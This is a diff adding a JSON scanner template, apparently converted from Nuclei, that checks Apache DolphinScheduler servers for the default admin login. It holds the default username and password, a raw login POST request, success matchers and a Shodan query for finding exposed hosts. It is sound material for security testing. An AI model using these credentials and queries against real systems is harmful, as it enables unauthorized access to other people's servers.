@@ -1,0 +1,166 @@
+{
+  "id": "dolphinscheduler-default-login",
+  "name": "Apache DolphinScheduler Default Login",
+  "author": "For3stCo1d",
+  "severity": "HIGH",
+  "description": "Apache DolphinScheduler default admin credentials were discovered.",
+  "references": [
+    "https://github.com/apache/dolphinscheduler"
+  ],
+  "tags": [
+    "apache",
+    "dolphinscheduler",
+    "default-login",
+    "oss"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "http.title:\"DolphinScheduler\""
+  },
+  "variables": {
+    "pass": [
+      "dolphinscheduler123"
+    ],
+    "user": [
+      "admin"
+    ]
+  },
+  "variablesType": "pitchfork",
+  "cweId": "CWE-522",
+  "cvssScore": "8.3",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /dolphinscheduler/login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nuserName\u003d{{user}}\u0026userPassword\u003d{{pass}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\"msg\":\"login success\"",
+            "\"sessionId\":"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "dolphinscheduler-default-login",
+    "info": {
+      "name": "Apache DolphinScheduler Default Login",
+      "author": "For3stCo1d",
+      "severity": "high",
+      "description": "Apache DolphinScheduler default admin credentials were discovered.",
+      "reference": [
+        "https://github.com/apache/dolphinscheduler"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+        "cvss_score": "8.3",
+        "cwe_id": "CWE-522"
+      },
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "http.title:\"DolphinScheduler\""
+      },
+      "tags": "apache,dolphinscheduler,default-login,oss"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "user": [
+            "admin"
+          ],
+          "pass": [
+            "dolphinscheduler123"
+          ]
+        },
+        "attack": "pitchfork",
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /dolphinscheduler/login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nuserName\u003d{{user}}\u0026userPassword\u003d{{pass}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\"msg\":\"login success\"",
+              "\"sessionId\":"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
